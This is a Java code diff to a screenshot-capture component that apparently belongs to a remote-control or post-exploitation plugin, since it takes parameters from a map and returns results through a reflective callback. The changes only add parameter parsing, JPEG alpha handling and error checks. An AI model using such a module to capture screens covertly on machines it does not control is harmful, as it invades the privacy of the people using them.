@@ -8,8 +8,10 @@ import javax.imageio.stream.ImageOutputStream;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
+import java.io.UnsupportedEncodingException;
 import java.util.HashMap;
 import java.util.Iterator;
+import java.util.Locale;
 
 /**
  * 屏幕截图组件
@@ -39,7 +41,7 @@ public class ScreenComponent implements Runnable {
         } catch (Throwable t) {
             if (results == null) results = new java.util.HashMap();
             results.put("code", Integer.valueOf(500));
-            results.put("msg", t.getMessage());
+            results.put("msg", t.getMessage() != null ? t.getMessage() : t.getClass().getName());
         }
         if (results != null) {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
@@ -61,18 +63,16 @@ public class ScreenComponent implements Runnable {
         }
         
         // 获取参数
-        String format = (String) params.get("format");
+        String format = getStringParam("format");
         if (format == null) format = "jpg";
-        format = format.toLowerCase();
+        format = format.trim().toLowerCase(Locale.ENGLISH);
         if (!isFormatSupported(format)) format = "jpg";
         
-        Object qualityObj = params.get("quality");
-        float quality = qualityObj instanceof Number ? ((Number) qualityObj).intValue() / 100.0f : 0.8f;
+        float quality = getFloatPercentParam("quality", 0.8f);
         if (quality < 0.0f) quality = 0.0f;
         if (quality > 1.0f) quality = 1.0f;
 
-        Object delayObj = params.get("delay");
-        int delay = delayObj instanceof Number ? ((Number) delayObj).intValue() : 100;
+        int delay = getIntParam("delay", 100);
         if (delay < 0) delay = 0;
         if (delay > 10000) delay = 10000;
         
@@ -171,6 +171,20 @@ public class ScreenComponent implements Runnable {
         if (!isFormatSupported(format)) {
             format = "jpg";
         }
+
+        BufferedImage outputImage = image;
+        if (("jpg".equalsIgnoreCase(format) || "jpeg".equalsIgnoreCase(format))
+                && image.getColorModel().hasAlpha()) {
+            outputImage = new BufferedImage(image.getWidth(), image.getHeight(), BufferedImage.TYPE_INT_RGB);
+            Graphics2D graphics = outputImage.createGraphics();
+            try {
+                graphics.setColor(Color.WHITE);
+                graphics.fillRect(0, 0, image.getWidth(), image.getHeight());
+                graphics.drawImage(image, 0, 0, null);
+            } finally {
+                graphics.dispose();
+            }
+        }
         
         // 获取图片写入器
         Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName(format);
@@ -192,8 +206,11 @@ public class ScreenComponent implements Runnable {
         ImageOutputStream ios = null;
         try {
             ios = ImageIO.createImageOutputStream(baos);
+            if (ios == null) {
+                throw new Exception("无法创建图片输出流");
+            }
             writer.setOutput(ios);
-            writer.write(null, new IIOImage(image, null, null), writeParam);
+            writer.write(null, new IIOImage(outputImage, null, null), writeParam);
         } finally {
             closeResource(ios);
             writer.dispose();
@@ -225,5 +242,42 @@ public class ScreenComponent implements Runnable {
                 // 忽略关闭异常
             }
         }
+    }
+
+    private String getStringParam(String key) {
+        Object value = params.get(key);
+        if (value == null) return null;
+        if (value instanceof String) return (String) value;
+        if (value instanceof byte[]) {
+            try { return new String((byte[]) value, "UTF-8"); }
+            catch (UnsupportedEncodingException ignored) { return new String((byte[]) value); }
+        }
+        return String.valueOf(value);
+    }
+
+    private int getIntParam(String key, int defaultValue) {
+        Object value = params.get(key);
+        if (value == null) return defaultValue;
+        if (value instanceof Number) return ((Number) value).intValue();
+        try { return Integer.parseInt(getStringParam(key).trim()); }
+        catch (NumberFormatException ignored) { return defaultValue; }
+    }
+
+    private float getFloatPercentParam(String key, float defaultValue) {
+        Object value = params.get(key);
+        if (value == null) return defaultValue;
+        float percent;
+        boolean fractional;
+        if (value instanceof Number) {
+            percent = ((Number) value).floatValue();
+            fractional = value instanceof Float || value instanceof Double;
+        } else {
+            String text = getStringParam(key).trim();
+            try { percent = Float.parseFloat(text); }
+            catch (NumberFormatException ignored) { return defaultValue; }
+            fractional = text.indexOf('.') >= 0;
+        }
+        if (fractional && percent >= 0.0f && percent <= 1.0f) return percent;
+        return percent / 100.0f;
     }
 }
